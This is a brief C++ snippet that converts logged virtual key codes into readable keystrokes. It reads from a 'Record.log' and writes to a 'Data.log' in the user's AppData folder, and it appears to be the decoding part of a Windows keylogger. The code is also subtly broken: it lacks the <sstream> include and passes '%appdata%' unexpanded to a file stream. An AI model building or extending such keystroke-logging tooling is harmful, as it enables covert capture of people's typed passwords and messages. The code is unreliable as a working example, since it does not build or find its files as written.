#include <fstream>
#include <string>
#include <vector>

std::string DecodeKey(int code) {
    switch(code) {
        case 8: return "[BACKSPACE]";
        case 9: return "[TAB]";
        case 13: return "\n";
        case 32: return " ";
        case 65 ... 90: return std::string(1, char(code));
        case 112 ... 123: return "[F" + std::to_string(code-111) + "]";
        // Add other cases as needed
        default: return "";
    }
}

void ProcessLog() {
    std::ifstream in("%appdata%\\Record.log");
    std::ofstream out("%appdata%\\Data.log");
    
    std::string line;
    while(getline(in, line)) {
        if(line[0] == '\t') {
            std::istringstream iss(line.substr(1));
            int keyCode;
            while(iss >> keyCode) {
                out << DecodeKey(keyCode);
            }
            out << "\n";
        }
    }
}